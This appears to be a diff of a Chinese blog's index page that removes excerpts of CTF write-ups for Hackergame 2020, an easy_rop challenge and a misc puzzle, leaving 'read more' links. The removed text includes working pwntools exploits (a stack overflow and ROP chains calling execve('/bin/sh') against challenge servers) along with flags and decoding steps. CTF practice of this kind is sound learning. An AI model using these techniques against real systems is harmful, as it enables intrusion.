@@ -188,7 +188,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-10 16:09:33" itemprop="dateModified" datetime="2020-11-10T16:09:33+08:00">2020-11-10</time>
+                <time title="修改时间：2020-11-11 22:15:37" itemprop="dateModified" datetime="2020-11-11T22:15:37+08:00">2020-11-11</time>
               </span>
 
           
@@ -203,44 +203,14 @@
 
       
           <h1 id="Hackergame-2020"><a href="#Hackergame-2020" class="headerlink" title="Hackergame 2020"></a>Hackergame 2020</h1><h2 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h2><p>这一题很容易发现要提取整数个flag他才会给你flag，但是题目中是调不到整数个的，但是我们观察url就可以发现解题方法。</p>
-<p><img src="/2020/11/07/hackergame2020/1.png" alt="image-20201107090523191"></p>
-<p>直接把number=1，2，3等整数就行。<del>超过一万就给不起了</del></p>
-<p><img src="/2020/11/07/hackergame2020/2.png"></p>
-<h2 id="0x02-猫咪问答"><a href="#0x02-猫咪问答" class="headerlink" title="0x02 猫咪问答"></a>0x02 猫咪问答</h2><p>第一个问题，，百度百度 必应必应 谷歌谷歌。</p>
-<p>第二个问，，也是百度百度。</p>
-<p>第三个问，去科大官网看看以前发的推送就能看到了。</p>
-<p>第四问，百度地图实景查看，，(或者找科大的同学呀)</p>
-<p>第五问，同第三问。</p>
-<h2 id="0x03-2048"><a href="#0x03-2048" class="headerlink" title="0x03 2048"></a>0x03 2048</h2><p>这题直接看源代码。</p>
-<p><img src="/2020/11/07/hackergame2020/3.png"></p>
-<p>继续往下看。</p>
-<p><img src="/2020/11/07/hackergame2020/4.png"></p>
-<p>如果赢了，就把url加上getflxg那一串，后面=‘b’+’a’+ +’a’+’a’很容易猜到就是banana啊。</p>
-<p>所以直接拿到flag。</p>
-<p><img src="/2020/11/07/hackergame2020/5.png"></p>
-<h2 id="0x04-一闪而过的flag"><a href="#0x04-一闪而过的flag" class="headerlink" title="0x04 一闪而过的flag"></a>0x04 一闪而过的flag</h2><p>这个嘛，就直接把文件下载下来，放到cmd里面运行就行了。<del>（不会真的有人截图的把）</del></p>
-<h2 id="0x05-从零开始的记账工具人"><a href="#0x05-从零开始的记账工具人" class="headerlink" title="0x05 从零开始的记账工具人"></a>0x05 从零开始的记账工具人</h2><p>暴力破解，别问花了多久，问就是5个小时。</p>
-<h2 id="0x06-超简单的世界模拟器"><a href="#0x06-超简单的世界模拟器" class="headerlink" title="0x06 超简单的世界模拟器"></a>0x06 超简单的世界模拟器</h2><p>百度一下生命游戏先。看到一个图案叫轻量级飞船，没2个回合向右边走一个周期，所以直接把飞船用在题目里就拿到第一个flag了，，第二个没写出来。</p>
-<h2 id="0x07-生活在博弈树上"><a href="#0x07-生活在博弈树上" class="headerlink" title="0x07 生活在博弈树上"></a>0x07 生活在博弈树上</h2><h3 id="始终热爱大地！！！"><a href="#始终热爱大地！！！" class="headerlink" title="始终热爱大地！！！"></a>始终热爱大地！！！</h3><p>首先嘛，先checksec一下看看。</p>
-<p><img src="/2020/11/07/hackergame2020/6.png"></p>
-<p>显示有canary，还开了nx。一开始我就不知道有canary怎么做，后来知道canary是假的，调试一下就发现了 。随后再把丢到ida里面看看。反编译看看main函数的伪代码，发现关键点。然后有一个gets危险函数把字符写到v12哪里，然后看ida算出偏移量为0x89。</p>
-<p><img src="/2020/11/07/hackergame2020/7.png"></p>
-<p>只要把v15覆盖为1就能得到flag。。不过再覆盖的时候一定注意先跑完前面的if的条件不然程序出不来。。。</p>
-<p>所以脚本就是：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form pwn <span class="keyword">import</span>*</span><br><span class="line">token = .....</span><br><span class="line">p = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>,<span class="number">10141</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your token: &quot;</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">payload = ’(<span class="number">1</span>,<span class="number">2</span>)<span class="string">&#x27; + &#x27;</span>a<span class="string">&#x27;*0x84 + p64(0x1)</span></span><br><span class="line"><span class="string">p.recvuntil(&quot;Your turn. Input like (x,y), such as (0,1): &quot;)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="升上天空！！"><a href="#升上天空！！" class="headerlink" title="升上天空！！"></a>升上天空！！</h3><p>第二题的话肯定就是要获得shell了。我当时第一思路就是系统调用，exevce(‘/bin/sh’,NULL,NULL)就能拿到shell。用ROPgadget找一找gadget。</p>
-<p><img src="/2020/11/07/hackergame2020/8.png"></p>
-<p>没有/bin/sh而且亲测/sh也都用不了。。所以我们要自己把/bin/sh写入bss段上去，调用gets函数。</p>
-<p>在ida中找到gets函数的地址，然后继续寻找需要的gadget。</p>
-<p><img src="/2020/11/07/hackergame2020/9.png"></p>
-<p><img src="/2020/11/07/hackergame2020/10.png"></p>
-<p>在找一段bss上的地址就行了。在ida上随便找一下，bss_addr=0x00000000004A9A01。</p>
-<p>之后就能构造payload了。这里要把程序跑通的话还需要把棋下输或者像第一题一样覆盖掉,我这里用1全部填充接直接过了检测了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">token = .....</span><br><span class="line">p = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>,<span class="number">10141</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your token: &quot;</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">pop_rax = <span class="number">0x000000000043e52c</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004017b6</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000407228</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000043dbb5</span></span><br><span class="line">pop_rbx = <span class="number">0x000000000046cb55</span></span><br><span class="line">bss_addr = <span class="number">0x00000000004A9A01</span></span><br><span class="line">gets_addr = <span class="number">0x409E00</span></span><br><span class="line">syscall_addr = <span class="number">0x0000000000402bf4</span></span><br><span class="line">payload=flat([<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x98</span> , pop_rdi , bss_addr , gets_addr , pop_rdi , bss_addr , pop_rsi , <span class="number">0</span> , pop_rdx , <span class="number">0</span> , pop_rax , <span class="number">0x3b</span> , syscall_addr])</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your turn. Input like (x,y), such as (0,1): &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>所以脚本就是这样的了，就能得到shell，拿到flag。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/11/07/hackergame2020/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
     <div>
@@ -293,7 +263,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-29 17:17:32" itemprop="dateModified" datetime="2020-10-29T17:17:32+08:00">2020-10-29</time>
+                <time title="修改时间：2020-11-11 22:15:25" itemprop="dateModified" datetime="2020-11-11T22:15:25+08:00">2020-11-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -317,30 +287,14 @@
 
       
           <h1 id="费脑子的rop"><a href="#费脑子的rop" class="headerlink" title="费脑子的rop"></a>费脑子的rop</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我还是太菜了，百度，wiki加学长指导还花了好几个小时才做出来easy_rop。。恶补了一波知识点。等我什么时候可以一个人不依靠其他做出来pwn才算入门呢。。。</p>
-<h2 id="Step-0x01"><a href="#Step-0x01" class="headerlink" title="Step 0x01"></a>Step 0x01</h2><p>一拿到这个题啊，名字是easy_rop，就是一道简单的rop链<del>(我呸)</del>，有了基本思路就直接先checksec一下。</p>
-<p><img src="/2020/10/27/easyrop%E4%B8%8Deasy/image-20201029161727195.png"></p>
-<p>是64位程序就丢到IDA64里，开了NA，其他保护没开。</p>
-<p><img src="/2020/10/27/easyrop%E4%B8%8Deasy/1.png"></p>
-<h2 id="Step-0x02"><a href="#Step-0x02" class="headerlink" title="Step 0x02"></a>Step 0x02</h2><p>第一个read函数读取了0x58个字符到name指向的内存就是bss段内存，然后可以看到bss段分配了非常大的内存空间，我们完全可以在这里建立rop链。</p>
-<p><img src="/2020/10/27/easyrop%E4%B8%8Deasy/2.png"></p>
-<p>同时看到main函数中的提示是系统调用函数，调用execve函数执行/bin/sh。而execve函数的系统调用号是59，就要让$rax的值变为0x3b即可。同时在搜索pop|ret  |rax命令并没有找的的情况下，我们利用rax保存函数的返回值这个知识点，利用read函数的返回值将rax的值变为0x3b即可。</p>
-<h2 id="Step-0x03"><a href="#Step-0x03" class="headerlink" title="Step 0x03"></a>Step 0x03</h2><p>那接下来我们就要考虑execve函数的几个参数的值，第一个参数是rdi，第二个是rsi第三个是rdx。我们要使execve(‘/bin/sh’,NULL,NULL)即可。</p>
-<p>之后我们就在第一次输入时构造rop。因为bss段完全可以放下rop链所以我们直接使用通用rop。</p>
-<p><img src="/2020/10/27/easyrop%E4%B8%8Deasy/3.png"></p>
-<p>脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;106.15.177.94&#x27;</span>,<span class="number">10055</span>)  <span class="comment">#p = process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;,user\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x40087a</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6010e8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6010a0</span>)+p64(<span class="number">0x400860</span>)+p64(<span class="number">0x40078a</span>))  <span class="comment">#构造rop链并且使rdx和rsi的值变为0了</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="Step-0x04"><a href="#Step-0x04" class="headerlink" title="Step 0x04"></a>Step 0x04</h2><p>rop好了以后就要考虑如何让程序执行我们写在bss上的rop链。这里要用到花式栈溢出里的劫持栈指针。可以参考CTFwiki里的相关内容。这里我们劫持栈指针rsp直接指向bss这里执行我们的命令。</p>
-<p>我们在0x400815处有leave retn命令，就直接拿来用。先把rop链的起始地址压到栈里成为rbp的值，在用leave retn指令将rbp的值给到rsp栈指针，这样程序就会从bss处开始执行我们写入的指令。脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;about it?\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x6010a0</span>)+p64(<span class="number">0x400815</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Step-0x05"><a href="#Step-0x05" class="headerlink" title="Step 0x05"></a>Step 0x05</h2><p>这样完整的脚本就写出来了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;106.15.177.94&#x27;</span>,<span class="number">10055</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;,user\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x40087a</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6010e8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x6010a0</span>)+p64(<span class="number">0x400860</span>)+p64(<span class="number">0x40078a</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;about it?\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x6010a0</span>)+p64(<span class="number">0x400815</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>之后就可以得到shell获取flag啦啦啦。</p>
-<p><img src="/2020/10/27/easyrop%E4%B8%8Deasy/4.png"></p>
-<p>全文结束，希望有看到的大佬能指点我的错误。<del>太难了太难了，我啥也不会</del>。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/27/easyrop%E4%B8%8Deasy/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
     <div>
@@ -393,7 +347,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-27 23:03:30" itemprop="dateModified" datetime="2020-10-27T23:03:30+08:00">2020-10-27</time>
+                <time title="修改时间：2020-11-11 22:15:47" itemprop="dateModified" datetime="2020-11-11T22:15:47+08:00">2020-11-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -417,45 +371,14 @@
 
       
           <h1 id="MIAO大师傅的套娃misc"><a href="#MIAO大师傅的套娃misc" class="headerlink" title="MIAO大师傅的套娃misc"></a>MIAO大师傅的套娃misc</h1><p>最近，<del>作为一个pwn手的我</del>作为一个萌新的我正式接触了misc，正好喵师傅发了一个红包闯关题，于是菜鸡我就花了一天多解决了这个套娃。<del>人都傻了，一度抓狂。</del>今天写下来我的wp，太难了。</p>
-<h2 id="Step-0000-0000"><a href="#Step-0000-0000" class="headerlink" title="Step 0000 0000"></a>Step 0000 0000</h2><p><a target="_blank" rel="noopener" href="https://miaotony.xyz/2020/01/25/CTF_2020HappyChineseNewYear/">题目链接</a></p>
-<h2 id="Step-0000-0001"><a href="#Step-0000-0001" class="headerlink" title="Step 0000 0001"></a>Step 0000 0001</h2><p>首先打开链接看到了第一层。</p>
-<p><img src="/2020/10/25/miaomisc/image-20201024123245795.png" alt="image-20201024123245795"></p>
-<p>社会主义核心价值观，很明显，直接百度找一个在线工具解码。</p>
-<p>得到了一串字符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NB2HI4DTHIXS63LJMFXXI33OPEXHQ6L2F5JTGQ3SIV2DKL3EONTGQ4LMMV3WWYLMNJWGWZTENZXXGL3TMZVGI2LPGJYTG4TLNRTGC3TGMRWDW23KMZWGWZLKMZWDWZ3GGMXUCMLTGBDDI23FGIZTGMZTF5GWSYLPFZUHI3LM</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>hint里提示是base解码，尝试base32解码后得到一个url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;miaotony.xyz&#x2F;S3CrEt5&#x2F;dsfhqlewkaljlkfdnos&#x2F;sfjdio2q3rklfanfdl;kjflkejfl;gf3&#x2F;A1s0F4ke23333&#x2F;Miao.html</span><br></pre></td></tr></table></figure>
-
-<p>[]: <a target="_blank" rel="noopener" href="https://miaotony.xyz/S3CrEt5/dsfhqlewkaljlkfdnos/sfjdio2q3rklfanfdl;kjflkejfl;gf3/A1s0F4ke23333/Miao.html">https://miaotony.xyz/S3CrEt5/dsfhqlewkaljlkfdnos/sfjdio2q3rklfanfdl;kjflkejfl;gf3/A1s0F4ke23333/Miao.html</a></p>
-<h2 id="Step-0000-0010"><a href="#Step-0000-0010" class="headerlink" title="Step 0000 0010"></a>Step 0000 0010</h2><p><img src="/2020/10/25/miaomisc/image-20201024124139395.png"></p>
-<p>​        直接给了一个超级长的字符串，先保存到本地。看前面可以发现这是一个邮件的源文件，所以我就直接转为eml文件，直接发给自己提取了附件flag.docx。。<del>（我想了好久。。。）</del>（直接提取似乎也可以？）</p>
-<p><img src="/2020/10/25/miaomisc/image-20201024130534165.png"></p>
-<p>所以 第一个flag来啦</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIAO&#123;12787966&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Step-0000-0011"><a href="#Step-0000-0011" class="headerlink" title="Step 0000 0011"></a>Step 0000 0011</h2><p>继续打开下一个url</p>
-<p><img src="/2020/10/25/miaomisc/image-20201024130649935.png"></p>
-<p>把这个图片保存到本地先，直接拖到010editor里面看看。发现了这是个zip压缩包。直接binwalk发现，foremost提取出来即可。</p>
-<p><img src="/2020/10/25/miaomisc/image-20201024131331295.png"></p>
-<h2 id="Step-0000-0100"><a href="#Step-0000-0100" class="headerlink" title="Step 0000 0100"></a>Step 0000 0100</h2><p>提取出来是一个需要密码的zip文件和一个txt文本，emm密码是上一个flag，我才发现这图片里是有flag的。miao师傅的hint里提示用ps，当然stegsolve也可以。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2：MIAO&#123;恭囍鼠你快乐喵贺&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Step-0000-0101"><a href="#Step-0000-0101" class="headerlink" title="Step 0000 0101"></a>Step 0000 0101</h2><p>然后我们继续打开压缩包</p>
-<p><img src="/2020/10/25/miaomisc/image-20201024220529557.png"></p>
-<p>一个hint.txt和png图片。</p>
-<p><img src="/2020/10/25/miaomisc/image-20201024212343758.png"></p>
-<p><del>这个 提示等于没有</del></p>
-<p><img src="/2020/10/25/miaomisc/image-20201024220553312.png"></p>
-<p>然后那个图片是提示文件头损坏无法解压。那就直接拖到010editor里面把文件头改过来zip文件的文件头是50 4B 03 04，改过来以后解压就是一张图片。拖进010editor里看了看也啥也没看出来，就又放到stegsolve里看看。提示是二维码，感觉也得不到什么。感觉应该是LSB隐写，就在stegsolve试了n遍后终于发现了一个文件头，是bmp文件的文件头。</p>
-<p><img src="/2020/10/25/miaomisc/image-20201024215312521.png"></p>
-<p>save下来，在editor里把前面的fffe去掉后改成bmp文件扩展名就打开了，确实是一个二维码。用手机扫一下就行了啊。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MIAO&#123;05739966&#125;; NEXT：</span><br><span class="line">base64,&#39;&#x3D;&#x3D;QAIIABGgwAIEABAAAAKMHAAAgC+UGb1R2btxDCaDAAAogcAAAAJIHAAAQCyBAAAkgc05WayBXBafWYsZ2XkVGdwlncj5WZOo1ZhxmZfhXZohgWAAAALIHAAAwAy91Xj9GZf91BabQK6MXZj5WZmBCepN1C6R2NjVzY1MWNjVzY1MWNjVzY1MWN1MDN2kzM2YTM2YjN2YDMzczMidjM2QzMyMDMzIzMyMTMzYzMzYjZ0UzMyMTOzMjN1YjNzczM2YDNzEDN1MjNzUzM1MDNzYzM3MDNzUzM5QTN3UzN1cTN3UzN1cTN3UzN1cDZ0gn2AAAALIXAKEgCBAAAAAgBzBAAA4gc0N3XvR3XyR3U4VGaNodew5ic0MTW3NjT5BHc0g0D6DAAAkgcAkqbpJ2XyR3cHoNbh1WajVGZhhXZotg2yR3cfhXZodg2DkSZk92YlRmBannZpxGelhmb1lg2pl2YzFmbpJGCaXGZvNmblZg2EkCOtYGd1VgeOJQKAMVAhGAZDAqA8JQfBEaA8JAoBQXA9FQoBQGAgCAfAAAAeMHAAAwQAAAADAAAAMAAAAAAAAAABMmTAAAAAkuCgQjMxADMyAjMgoTZtlGVApQeu9GVvFWaNBiOy9Ga0VXQApgC+JHNzkFI3NjTgkHcwRDSKESIh4WdmBSZ2FGagQ3c1pkCh42bvNHIHFETGBSZoRHI0V2ZgwGbpdHI19WWKImeHkCATJAZAEgADSQZGQWBlRgWBM4AlJQZDoVBkJgWAQIBkNAZBoVAsJAZBQGAaBAZAAAAuMHAAAAQAAAADAAAAAAAAAAAAAAAAMOAAIAMepy4BCAAAAgCN0gQ&#39;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第三个flag了：MIAO&#123;05739966&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Step-0000-0110"><a href="#Step-0000-0110" class="headerlink" title="Step 0000 0110"></a>Step 0000 0110</h2>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/25/miaomisc/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
     <div>
